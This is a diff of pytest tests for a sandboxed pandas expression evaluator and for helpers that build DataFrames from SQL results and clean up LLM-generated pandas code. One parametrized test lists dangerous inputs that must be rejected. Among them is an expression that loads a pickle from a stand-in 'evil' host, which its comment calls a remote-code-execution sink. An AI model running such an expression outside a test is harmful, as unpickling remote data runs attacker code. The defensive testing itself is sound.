@@ -104,3 +104,89 @@ def test_safe_eval_pandas_rejects_dangerous(expr):
 def test_run_with_timeout_raises():
     with pytest.raises(TimeoutError):
         _run_with_timeout(lambda: _time.sleep(2.0), 0.2)
+
+
+@pytest.mark.parametrize("expr", [
+    'pd.read_pickle("http://evil/x")',   # module RCE sink — pd must be out of scope
+    'pd.read_sql("SELECT 1", con)',      # module DB sink
+    'df.to_pickle("x")',                 # DataFrame I/O sink (write)
+    'df.to_csv("x")',
+    'df.to_sql("t", con)',
+    'df.query("v > 0")',                 # secondary eval engine
+    'np.zeros(3)',                       # np must be out of scope
+    "[x for x in df]",                   # comprehension binds a new name
+])
+def test_safe_eval_pandas_blocks_io_sinks_and_modules(expr):
+    # These are rejected statically (AST allowlist) BEFORE any eval, so the
+    # sink never executes. The old regex denylist let pd.read_pickle through.
+    with pytest.raises(ValueError):
+        safe_eval_pandas(expr, _df())
+
+
+def test_safe_eval_pandas_allows_safe_builtins_and_groupby():
+    assert safe_eval_pandas('len(df[df["v"] > 1])', _df()) == 2
+    out = safe_eval_pandas('df.groupby("g")["v"].sum()', _df())
+    assert int(out.loc["a"]) == 3 and int(out.loc["b"]) == 3
+
+
+import asyncio
+
+from agents.dpc_verifier import (
+    extract_columns_rows,
+    generate_pandas_solution,
+    materialize_table,
+)
+from agents.tool_registry import Tool, ToolRegistry
+
+
+def _tools(result):
+    reg = ToolRegistry()
+
+    async def _exec(*, query, connection_id="default"):
+        return result
+
+    reg.register(Tool(name="execute_sql", description="x", category="sql", fn=_exec))
+    return reg
+
+
+class _FixedLLM:
+    def __init__(self, text):
+        self._text = text
+
+    def is_available(self):
+        return True
+
+    def generate(self, prompt, **kw):
+        return self._text
+
+
+def test_extract_columns_rows_from_dict():
+    cols, rows = extract_columns_rows({"columns": ["a"], "rows": [[1]]})
+    assert cols == ["a"] and rows == [[1]]
+
+
+def test_materialize_table_builds_dataframe():
+    tbl = {"columns": ["g", "v"], "rows": [["a", 1], ["b", 2]]}
+    df = asyncio.run(materialize_table("t", _tools(tbl), max_rows=1000))
+    assert list(df.columns) == ["g", "v"]
+    assert df["v"].sum() == 3
+
+
+def test_materialize_table_too_large_returns_none():
+    tbl = {"columns": ["v"], "rows": [[1], [2], [3]]}
+    assert asyncio.run(materialize_table("t", _tools(tbl), max_rows=2)) is None
+
+
+def test_generate_pandas_solution_strips_fence():
+    df = pd.DataFrame({"v": [1, 2]})
+    expr = generate_pandas_solution("total v", df, _FixedLLM('```python\ndf["v"].sum()\n```'))
+    assert expr == 'df["v"].sum()'
+
+
+def test_generate_pandas_solution_raises_when_unavailable():
+    class _Down(_FixedLLM):
+        def is_available(self):
+            return False
+
+    with pytest.raises(RuntimeError):
+        generate_pandas_solution("q", pd.DataFrame({"v": [1]}), _Down(""))
